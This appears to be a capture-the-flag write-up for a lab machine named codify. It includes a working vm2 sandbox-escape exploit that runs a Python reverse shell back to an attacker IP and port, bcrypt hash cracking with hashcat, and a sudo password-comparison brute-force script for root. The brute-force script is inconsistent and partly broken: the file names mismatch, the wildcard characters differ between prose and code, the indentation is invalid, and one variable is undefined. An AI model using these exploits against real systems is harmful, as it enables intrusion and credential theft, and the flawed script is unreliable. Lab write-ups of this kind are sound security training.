## Port Scan

```shell
┌──(kali㉿kali)-[~]
└─$ sudo nmap 10.129.38.38 -sV          
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-25 17:05 CET
Nmap scan report for 10.129.38.38
Host is up (0.041s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.52
3000/tcp open  http    Node.js Express framework
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.75 seconds
```

There is a website on port 80. The website on port 3000 is identical with not much to do.

## Vulnerable VM 

Looking at the About section in the website it becomes clear that the website uses the `vm2` library to execute code on the server side. This code works to exploit a known vulnerability in `vm2`. Just run it in the code form. This is a slightly modified version from the online version as here we directly inject the `node.js` code in the shell.

```javascript
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('python3 -c "import os,pty,socket;s=socket.socket();s.connect((\'10.10.14.29\',9000));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\'bash\')" ');
}
```


## Piovra

As a nice notice, Piovra works to keep a persistent shell from now on, while waiting to get some SSH credentials.

## Exploration

There is a ticket.db file in `/var/www/contact.` This is a `sqlite` database file. Even without opening it via the appropriate binary (that is not available in the machine) the password hash is clearly identifiable inside it and it's easily crackable with hashcat and rockyou. 

Store the Blowfish Hash in a `hash.txt` file and run:

```shell
hashcat -m3200 hash.txt /usr/share/wordlists/rockyou.txt.gz
```

The password is `spongebob1`.

## User Joshua

This password works to get into user `joshua` via ssh. 
Now that we have the user the user flag is done.

## Privilege Escalation

The privilege escalation requires a brute force work. Running `sudo -l` we notice that there is a script that can be executed with root privileges. Analyzing its content, it is clear that there is a password check that is incorrectly enclosed into double brackets.

```shell
if [[ $ROOTPASS == $USERPASS ]]
```

This is vulnerable by injecting a `*` pattern into the User Password. Then the script runs. Unfortunately we do not obtain much from it and we cannot easily inject any code in it as it's correctly quoted everywhere. 

The solution is to brute force it. There is also a monitoring solution but it's very hard, way harder than this one (monitor the process to catch the moment before the password on the CLI gets replaced... you have to be too fast or too lucky).

So one can inject more complex patterns in the `USERPASS` until the password is retrieved. Letter by letter it is possible to catch the result. A Python script will make it. 

First let's define a convenient shell script `crack.txt` to simplify the injection, with the following one-line content:

```shell
sudo /opt/scripts/mysql-backup.sh <<< $1
```

Then the python script `crack.py` is the following:

```python
import itertools  
import string
import subprocess  
import sys  
  
def combo(prefix):  
	for i in itertools.permutations(string.printable, 1):  
		yield prefix + str(i[0]) + "?"*(20-len(prefix))  

def execute_script_with_sudo(dynamic_password):  
	"""Execute the script with sudo using fixed and dynamic passwords."""
	process = subprocess.run(f"bash -i crack.sh {dynamic_password}", 
	    shell=True,  capture_output=True, text=True)  
    print(process.stderr)  
    print(process.stdout)  
    if "confirmed" in process.stdout+process.stderr:  
        sys.exit()  
  
if __name__ == "__main__":  
    # Generate dynamic passwords  
    prefix = ""  
    if len(sys.argv) == 2:  
        prefix = sys.argv[1]  
        passwords_generator = combo(prefix)  
    
    # Execute the script with sudo for each generated password  
    for dynamic_password in passwords_generator:  
        print("Now testing ", dynamic_password)  
        execute_script_with_sudo(dynamic_password)
```

It requires a few iterations: the script will try a single random letter with the suffix `*` and it will exit if a letter will make it. This means the letter is a valid letter in the password.

At the next execution one can call the same script using the already discovered letters as a prefix (first and only argument) and the script will run again using that additional prefix, discovering an additional letter. 

Once all letters are discovered the script will not print any additional letter meaning the existing letters are the password.

The password is: `kljh12k3jhaskjh12kjh3` and this is the root password, so the privilege escalation can be done via ssh.
